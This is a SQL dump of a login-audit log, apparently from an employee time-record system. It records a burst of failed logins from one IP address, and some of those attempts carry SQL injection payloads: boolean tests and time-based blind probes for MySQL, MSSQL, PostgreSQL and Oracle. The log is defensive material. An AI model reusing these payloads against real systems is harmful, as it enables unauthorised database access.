INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('940', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('941', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('942', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('943', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('944', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: \'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('945', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('946', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('947', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('948', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('949', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: <!--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('950', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('951', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('952', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('953', '', '2023-05-08 03:42:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('954', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('955', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('956', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('957', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('958', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('959', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('960', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('961', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('962', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('963', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('964', '', '2023-05-08 03:42:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('965', '', '2023-05-08 03:42:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('966', '', '2023-05-08 03:42:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('967', '', '2023-05-08 03:42:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('968', '', '2023-05-08 03:42:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('969', '', '2023-05-08 03:42:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('970', '', '2023-05-08 03:42:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('971', '', '2023-05-08 03:42:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('972', '', '2023-05-08 03:42:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('973', '', '2023-05-08 03:42:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('974', '', '2023-05-08 03:42:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('975', '', '2023-05-08 03:42:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('976', '', '2023-05-08 03:42:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('977', '', '2023-05-08 03:42:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('978', '', '2023-05-08 03:42:51', '', 'Invalid username/password. Tried with: Ig7WgIs1', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('979', '', '2023-05-08 03:42:52', '', 'Invalid username/password. Tried with: -1 OR 2+653-653-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('980', '', '2023-05-08 03:42:52', '', 'Invalid username/password. Tried with: -1 OR 2+29-29-1=0+0+0+1', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('981', '', '2023-05-08 03:42:52', '', 'Invalid username/password. Tried with: -1\' OR 2+721-721-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('982', '', '2023-05-08 03:42:52', '', 'Invalid username/password. Tried with: -1\' OR 2+341-341-1=0+0+0+1 or \'rR7kmyjj\'=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('983', '', '2023-05-08 03:42:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('984', '', '2023-05-08 03:42:53', '', 'Invalid username/password. Tried with: -1\" OR 2+79-79-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('985', '', '2023-05-08 03:42:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('986', '', '2023-05-08 03:42:54', '', 'Invalid username/password. Tried with: if(now()=sysdate(),sleep(15),0)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('987', '', '2023-05-08 03:42:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('988', '', '2023-05-08 03:42:56', '', 'Invalid username/password. Tried with: 0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('989', '', '2023-05-08 03:42:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('990', '', '2023-05-08 03:42:57', '', 'Invalid username/password. Tried with: 0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('991', '', '2023-05-08 03:42:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('992', '', '2023-05-08 03:42:59', '', 'Invalid username/password. Tried with: (select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('993', '', '2023-05-08 03:43:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('994', '', '2023-05-08 03:43:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('995', '', '2023-05-08 03:43:02', '', 'Invalid username/password. Tried with: 1 waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('996', '', '2023-05-08 03:43:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('997', '', '2023-05-08 03:43:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('998', '', '2023-05-08 03:43:03', '', 'Invalid username/password. Tried with: hYlI553E\'; waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('999', '', '2023-05-08 03:43:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1000', '', '2023-05-08 03:43:05', '', 'Invalid username/password. Tried with: 1MjOfQHi\' OR 135=(SELECT 135 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1001', '', '2023-05-08 03:43:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1002', '', '2023-05-08 03:43:07', '', 'Invalid username/password. Tried with: alXuYnxY\') OR 116=(SELECT 116 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1003', '', '2023-05-08 03:43:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1004', '', '2023-05-08 03:43:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1005', '', '2023-05-08 03:43:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1006', '', '2023-05-08 03:43:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1007', '', '2023-05-08 03:43:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1008', '', '2023-05-08 03:43:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1009', '', '2023-05-08 03:43:09', '', 'Invalid username/password. Tried with: PjJ4WiHB\')) OR 588=(SELECT 588 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1010', '', '2023-05-08 03:43:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1011', '', '2023-05-08 03:43:10', '', 'Invalid username/password. Tried with: RDFYjolf\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1012', '', '2023-05-08 03:43:11', '', 'Invalid username/password. Tried with: 1\'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1013', '', '2023-05-08 03:43:11', '', 'Invalid username/password. Tried with: 1%2527%2522', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1014', '', '2023-05-08 03:43:11', '', 'Invalid username/password. Tried with: @@4iuFC', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1015', '', '2023-05-08 03:43:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1016', '', '2023-05-08 03:43:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1017', '', '2023-05-08 03:43:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1018', '', '2023-05-08 03:43:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1019', '', '2023-05-08 03:43:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1020', '', '2023-05-08 03:43:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1021', '', '2023-05-08 03:43:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1022', '', '2023-05-08 03:43:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1023', '', '2023-05-08 03:43:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1024', '', '2023-05-08 03:43:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1025', '', '2023-05-08 03:43:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1026', '', '2023-05-08 03:43:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1027', '', '2023-05-08 03:43:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1028', '', '2023-05-08 03:43:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1029', '', '2023-05-08 03:43:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1030', '', '2023-05-08 03:43:19', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1031', '', '2023-05-08 03:43:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1032', '', '2023-05-08 03:43:20', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1033', '', '2023-05-08 03:43:21', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1034', '', '2023-05-08 03:43:22', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1035', '', '2023-05-08 03:43:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1036', '', '2023-05-08 03:43:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1037', '', '2023-05-08 03:43:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1038', '', '2023-05-08 03:43:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1039', '', '2023-05-08 03:43:23', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1040', '', '2023-05-08 03:43:24', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1041', '', '2023-05-08 03:43:26', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1042', '', '2023-05-08 03:43:27', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1043', '', '2023-05-08 03:43:28', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1044', '', '2023-05-08 03:43:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1045', '', '2023-05-08 03:43:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1046', '', '2023-05-08 03:43:29', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1047', '', '2023-05-08 03:43:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1048', '', '2023-05-08 03:43:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1049', '', '2023-05-08 03:43:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1050', '', '2023-05-08 03:43:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1051', '', '2023-05-08 03:43:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1052', '', '2023-05-08 03:43:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1053', '', '2023-05-08 03:43:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1054', '', '2023-05-08 03:43:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1055', '', '2023-05-08 03:43:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1056', '', '2023-05-08 03:43:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1057', '', '2023-05-08 03:43:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1058', '', '2023-05-08 03:43:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1059', '', '2023-05-08 03:43:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1060', '', '2023-05-08 03:43:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1061', '', '2023-05-08 03:43:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1062', '', '2023-05-08 03:43:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1063', '', '2023-05-08 03:43:43', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1064', '', '2023-05-08 03:43:44', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('1065', '', '2023-05-08 03:43:45', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
